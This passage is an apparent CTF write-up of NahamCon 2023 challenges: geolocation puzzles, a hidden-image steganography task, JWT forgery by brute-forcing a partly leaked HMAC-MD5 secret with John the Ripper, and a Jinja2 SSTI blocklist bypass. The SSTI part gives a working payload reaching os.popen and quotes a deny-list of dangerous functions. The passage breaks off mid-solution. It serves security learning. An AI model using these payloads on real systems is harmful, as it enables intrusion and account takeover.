<p>We are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match.
From chall3:</p>
<p><img src="/p/nahamconctf_2023/images/20230615170757.png"
	width="914"
	height="467"
	srcset="/p/nahamconctf_2023/images/20230615170757_hu15723920937948977576.png 480w, /p/nahamconctf_2023/images/20230615170757_hu9863571668784769327.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615170757.png"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="469px"
	
></p>
<p>From Sheep Meadow street view:</p>
<p><img src="/p/nahamconctf_2023/images/20230615170908.png"
	width="594"
	height="296"
	srcset="/p/nahamconctf_2023/images/20230615170908_hu17626629319471114189.png 480w, /p/nahamconctf_2023/images/20230615170908_hu6300709813158746228.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615170908.png"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>Once again, finding the same view location as the challenge:</p>
<p><img src="/p/nahamconctf_2023/images/20230615171150.png"
	width="366"
	height="310"
	srcset="/p/nahamconctf_2023/images/20230615171150_hu16081354895809648132.png 480w, /p/nahamconctf_2023/images/20230615171150_hu1624901779917299202.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615171150.png"
	
	
		class="gallery-image" 
		data-flex-grow="118"
		data-flex-basis="283px"
	
></p>
<p><code>flag{aa1b04ee3ded3a7c3ee16be1ff85e99c}</code></p>
<h3 id="chall4">Chall4
</h3><blockquote>
<p>Author: @Gary#4657</p>
<p>Head over to <a class="link" href="https://osint.golf"  target="_blank" rel="noopener"
    >https://osint.golf</a> and select <strong><code>chall4</code> under the NahamCon2023</strong> category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!<br>
<em>NOTE:</em> The integrated compass direction is inconsistent with the actual panorama representation.</p>
</blockquote>
<hr>
<p>In the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.</p>
<p><img src="/p/nahamconctf_2023/images/2023-06-1517-16-51.png"
	width="659"
	height="367"
	srcset="/p/nahamconctf_2023/images/2023-06-1517-16-51_hu18234396525249952909.png 480w, /p/nahamconctf_2023/images/2023-06-1517-16-51_hu7578993864822600070.png 1024w"
	loading="lazy"
	
		alt="Screenshot from 2023-06-15 17-16-51.png"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<p>From this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building&rsquo;s design and colors match very well. The second building I searched for is the neighboring church-like building.</p>
<p><img src="/p/nahamconctf_2023/images/2023-06-1517-27-17.png"
	width="192"
	height="318"
	srcset="/p/nahamconctf_2023/images/2023-06-1517-27-17_hu18032428658248435708.png 480w, /p/nahamconctf_2023/images/2023-06-1517-27-17_hu8281390338809339237.png 1024w"
	loading="lazy"
	
		alt="Screenshot from 2023-06-15 17-27-17.png"
	
	
		class="gallery-image" 
		data-flex-grow="60"
		data-flex-basis="144px"
	
></p>
<p>There were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. <a class="link" href="https://www.komoot.com/highlight/3217858"  target="_blank" rel="noopener"
    >this web posting</a> seems to be reviewing it as a bike trail. Examining the geography in a google map search for <code>Schloss Ebenfurth</code>, it instantly became clear that this is the same location as the challenge.</p>
<p><img src="/p/nahamconctf_2023/images/20230615173152.png"
	width="433"
	height="233"
	srcset="/p/nahamconctf_2023/images/20230615173152_hu4328516349617501117.png 480w, /p/nahamconctf_2023/images/20230615173152_hu3671770735385602622.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615173152.png"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="446px"
	
></p>
<p><img src="/p/nahamconctf_2023/images/20230615173224.png"
	width="564"
	height="329"
	srcset="/p/nahamconctf_2023/images/20230615173224_hu10555400248589947752.png 480w, /p/nahamconctf_2023/images/20230615173224_hu8800167095152976666.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615173224.png"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="411px"
	
></p>
<p>I was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.</p>
<p><code>flag{2e57cfe16d7e1c5431aa3b99d0e713cb}</code></p>
<h2 id="web">Web
</h2><h3 id="hidden-figures">Hidden Figures
</h3><blockquote>
<p>Author: @JohnHammond#6971</p>
<p>Look at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!</p>
</blockquote>
<hr>
<p>Entering the website we see a pretty well-constructed page promoting <code>Hidden Figures</code>, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored.
Early on, I noticed that folder directory <code>/assets/</code> is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type?</p>
<p><img src="/p/nahamconctf_2023/images/20230616185356.png"
	width="1820"
	height="458"
	srcset="/p/nahamconctf_2023/images/20230616185356_hu17091823093477718468.png 480w, /p/nahamconctf_2023/images/20230616185356_hu14753804815501705053.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616185356.png"
	
	
		class="gallery-image" 
		data-flex-grow="397"
		data-flex-basis="953px"
	
></p>
<p>After some lengthy enumeration, I found nothing of interest.</p>
<p>Looking at the page source, I noticed that there are several links with <em>very</em> long url codes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>And so on. I didn&rsquo;t know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website&rsquo;s running state.</p>
<p>Eventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing <code>data:image/png;base64,</code> I base64 decoded the info:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat url | base64 -d &gt; decode_url 
</span></span></code></pre></td></tr></table>
</div>
</div><p>And so on, for all 4 images found.</p>
<p>Checking <code>exiftool</code> didn&rsquo;t give me any critical information, however <code>binwalk</code> did show me something <em>hidden</em> in the figures.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ binwalk decode_url2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span>             0x0             JPEG image data, JFIF standard 1.01
</span></span><span class="line"><span class="cl"><span class="m">15486</span>         0x3C7E          PNG image, <span class="m">1851</span> x 174, 8-bit/color RGB, non-interlaced
</span></span><span class="line"><span class="cl"><span class="m">15527</span>         0x3CA7          Zlib compressed data, default compression
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is another image hidden here, and potentially some compressed data?
Extracting with binwalk:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ binwalk -D<span class="o">=</span><span class="s2">&#34;.*&#34;</span> decode_url2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span>             0x0             JPEG image data, JFIF standard 1.01
</span></span><span class="line"><span class="cl"><span class="m">15486</span>         0x3C7E          PNG image, <span class="m">1851</span> x 174, 8-bit/color RGB, non-interlaced
</span></span><span class="line"><span class="cl"><span class="m">15527</span>         0x3CA7          Zlib compressed data, default compression
</span></span></code></pre></td></tr></table>
</div>
</div><p>Viewing the hidden PNG image:</p>
<p><img src="/p/nahamconctf_2023/images/20230617121633.png"
	width="1700"
	height="116"
	srcset="/p/nahamconctf_2023/images/20230617121633_hu3441202308961360056.png 480w, /p/nahamconctf_2023/images/20230617121633_hu5117293524192417705.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230617121633.png"
	
	
		class="gallery-image" 
		data-flex-grow="1465"
		data-flex-basis="3517px"
	
></p>
<p><code>flag{e62630124508ddb3952843f183843343}</code></p>
<h3 id="marmalade-5">Marmalade 5
</h3><blockquote>
<p>Author: @congon4tor#2334</p>
<p>Enjoy some of our delicious home made marmalade!</p>
</blockquote>
<hr>
<p>We are prompted to choose a username to log in. No password asked. Firstly trying admin, of course we are not allowed. So I go with my old friend <code>asdf</code>.</p>
<p><img src="/p/nahamconctf_2023/images/20230615153302.png"
	width="483"
	height="207"
	srcset="/p/nahamconctf_2023/images/20230615153302_hu12401132303088314162.png 480w, /p/nahamconctf_2023/images/20230615153302_hu6294443826789364444.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230615153302.png"
	
	
		class="gallery-image" 
		data-flex-grow="233"
		data-flex-basis="560px"
	
></p>
<p>On login, it tells us that only admin can see the flag:</p>
<p><img src="/p/nahamconctf_2023/images/20230616173145.png"
	width="482"
	height="192"
	srcset="/p/nahamconctf_2023/images/20230616173145_hu7393832208866158326.png 480w, /p/nahamconctf_2023/images/20230616173145_hu8054624348227470677.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616173145.png"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="602px"
	
></p>
<p>With how little content is on these pages, there is pretty much nothing else to consider other than editing the given cookie:
<code>token=eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg</code>
Based on the cookie having 3 sections separated by dots, I immediately recognize this as a JWT. Using jwt.io to decode:</p>
<p><img src="/p/nahamconctf_2023/images/20230616173339.png"
	width="1178"
	height="521"
	srcset="/p/nahamconctf_2023/images/20230616173339_hu6859061640641877783.png 480w, /p/nahamconctf_2023/images/20230616173339_hu13750255246226924978.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616173339.png"
	
	
		class="gallery-image" 
		data-flex-grow="226"
		data-flex-basis="542px"
	
></p>
<p>The blue segment is a signature hashed with a secret key to prevent forgery, but this is not always used to verify. Perhaps we can just edit the Payload section so that our username is admin?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;username&#34;: &#34;admin&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Converting back to base64, our new token looks like this
<code>eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.SKkdg9_2EbXj67FcZNnXIg</code></p>
<p>When I edit the cookie, it gives me an interesting new error:</p>
<p><img src="/p/nahamconctf_2023/images/20230616173646.png"
	width="938"
	height="86"
	srcset="/p/nahamconctf_2023/images/20230616173646_hu16178423462212437339.png 480w, /p/nahamconctf_2023/images/20230616173646_hu6096890753136663098.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616173646.png"
	
	
		class="gallery-image" 
		data-flex-grow="1090"
		data-flex-basis="2617px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Bad Request
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg*****
</span></span></code></pre></td></tr></table>
</div>
</div><p>So while they are checking the token signatures, they did a bit of an oopsie and gave away most of their secret key!! Only the last 5 characters are hidden, making this secret key effectively 5 characters in length. This is something that can be brute-forced rather easily.</p>
<p>I used python to quickly generate a wordlist containing the known secret string, then appended all possible 5 letter combinations:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;wordlist.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;fsrwjcfszeg&#39;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">l</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="o">+</span>  <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>From this point, I can use my previously valid JWT for asdf, and use <code>John the Ripper</code> to brute force the secret key. John will accept the token when the signature is presented in hex, however I had trouble converting myself for some reason. This issue was resolved once I used <a class="link" href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py"  target="_blank" rel="noopener"
    >Sjord&rsquo;s jwtcrack code</a> to recreate my token.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python convert.py <span class="s1">&#39;eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg&#39;</span>
</span></span><span class="line"><span class="cl">eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ#48a91d83dff611b5e3ebb15c64d9d722
</span></span></code></pre></td></tr></table>
</div>
</div><p>Cracking the secret with john:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ john jwt.txt --wordlist<span class="o">=</span>wordlist.txt --format<span class="o">=</span>HMAC-MD5
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>HMAC-MD5 <span class="o">[</span>password is key, MD5 256/256 AVX2 8x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Warning: poor OpenMP scalability <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">2</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">fsrwjcfszegvsyfa <span class="o">(</span>?<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:04 DONE <span class="o">(</span>2023-06-16 13:39<span class="o">)</span> 0.2487g/s 2472Kp/s 2472Kc/s 2472KC/s fsrwjcfszegvsxlg..fsrwjcfszegvtppv
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=HMAC-MD5&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed. 
</span></span></code></pre></td></tr></table>
</div>
</div><p>The secret key is <code>fsrwjcfszegvsyfa</code>
Now to generate a valid signature for our forged jwt. Using the first 2 base64 encoded segments, we perform HMAC-MD5 hashing, then convert from hex back to base64:</p>
<p><img src="/p/nahamconctf_2023/images/20230616174953.png"
	width="1106"
	height="439"
	srcset="/p/nahamconctf_2023/images/20230616174953_hu1780411787314534197.png 480w, /p/nahamconctf_2023/images/20230616174953_hu6782218997246644206.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616174953.png"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="604px"
	
></p>
<p>Finalized token:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.kpCxx3dVioNEfybFE2UBxg
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upon refreshing the page, we get the flag.</p>
<p><img src="/p/nahamconctf_2023/images/20230616141001.png"
	width="493"
	height="244"
	srcset="/p/nahamconctf_2023/images/20230616141001_hu16897681129568436626.png 480w, /p/nahamconctf_2023/images/20230616141001_hu4475734941208441322.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616141001.png"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="484px"
	
></p>
<p><code>flag{a249dff54655158c25ddd3584e295c3b}</code></p>
<h3 id="obligatory">Obligatory
</h3><blockquote>
<p>Author: @congon4tor#2334</p>
<p>Every Capture the Flag competition has to have an obligatory to-do list application, right???</p>
</blockquote>
<hr>
<p>Firstly, we are greeted with a sign-in page</p>
<p><img src="/p/nahamconctf_2023/images/20230616165433.png"
	width="366"
	height="491"
	srcset="/p/nahamconctf_2023/images/20230616165433_hu7769757932286518676.png 480w, /p/nahamconctf_2023/images/20230616165433_hu502520786581116217.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616165433.png"
	
	
		class="gallery-image" 
		data-flex-grow="74"
		data-flex-basis="178px"
	
></p>
<p>Typical admin:admin guesses do not work, so after making a new account</p>
<p><img src="/p/nahamconctf_2023/images/20230616165611.png"
	width="1110"
	height="399"
	srcset="/p/nahamconctf_2023/images/20230616165611_hu18138042967213493087.png 480w, /p/nahamconctf_2023/images/20230616165611_hu4712117253275817106.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616165611.png"
	
	
		class="gallery-image" 
		data-flex-grow="278"
		data-flex-basis="667px"
	
></p>
<p>I created a new task <code>asdf</code>, and this is the result. After exploring the POST parameters done during submission, as well as how things are altered when tasks are moved between active and completed, I did not see any interesting pattern. The most notable piece is that trashing my first task leads to <code>http://challenge.nahamcon.com:32053/delete?id=2</code>. However, <code>id=1</code> appears inaccessible.</p>
<p>When I turned my attention to the greentext, I noticed in the url we see this as well:
<code>http://challenge.nahamcon.com:32053/?success=Task%20created</code>
Editing the success= component will affect what is being displayed in green. After playing for a bit, I noticed that this is actually vulnerable to SSTI:
<code>http://challenge.nahamcon.com:32053/?success={{7*7}}</code></p>
<p><img src="/p/nahamconctf_2023/images/20230616154856.png"
	width="712"
	height="179"
	srcset="/p/nahamconctf_2023/images/20230616154856_hu11513414978327234135.png 480w, /p/nahamconctf_2023/images/20230616154856_hu8097426181497659647.png 1024w"
	loading="lazy"
	
		alt="Pasted image 20230616154856.png"
	
	
		class="gallery-image" 
		data-flex-grow="397"
		data-flex-basis="954px"
	
></p>
<p>Doing actions such as <code>curl -v</code> did not give any insight on the framework being used, but exploring the SSTI a little further gave me the impression that this is likely Jinja2:
`<a class="link" href="http://challenge.nahamcon.com:32053/?success=%7b%7b7"  target="_blank" rel="noopener"
    >http://challenge.nahamcon.com:32053/?success={{7</a>*&lsquo;7&rsquo;}}``</p>
<p><img src="https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616155028.png"
	
	
	
	loading="lazy"
	
		alt="Pasted image 20230616155028.png"
	
	
></p>
<p>Knowing this, I tried some simple enumerations before I find the true difficulty of this challenge:
<code>http://challenge.nahamcon.com:32053/?success={{config}}</code></p>
<p><img src="https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616170342.png"
	
	
	
	loading="lazy"
	
		alt="Pasted image 20230616170342.png"
	
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">HACKER DETECTED!!!!  
</span></span><span class="line"><span class="cl">The folowing are not allowed: [ {{\s*config\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\..*,.*\[.*,.*\].*,.*\_\_.* ]
</span></span></code></pre></td></tr></table>
</div>
</div><p>It wasn&rsquo;t obvious to me at first, but the real trouble is that any command containing a dot, or square brackets, is blocked.
After spending a good amount of time looking for ways to bypass the filter, I eventually ran into <a class="link" href="https://hackmd.io/@Chivato/HyWsJ31dI"  target="_blank" rel="noopener"
    >this post</a>. Importantly, the writer manages to create a payload to bypass &ldquo;.&rdquo;,&quot;_&quot;, &ldquo;[]&rdquo;, and even &ldquo;|join&rdquo;.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Our blacklist also includes some functions that were used, which I bypassed by breaking between quotes (popen -&gt; po&rsquo;&lsquo;pen).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\x5f\x5fglobals\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fbuil%27%27tins\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(%27\x5f\x5fimp%27%27ort\x5f\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://github.com/spencerja/NahamConCTF_2023_Writeup/blob/main/Web/Images/Pasted%20image%2020230616171249.png"
	
	
	
	loading="lazy"
	
		alt="Pasted image 20230616171249.png"
	
	
></p>
<p>We have successful code execution!! Now all that remains is to find the flag.</p>
<p>After some enumeration of where the flag might be, I began to think that perhaps there isn&rsquo;t a <code>flag.txt</code> file after all. When I check the contents of the cwd:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
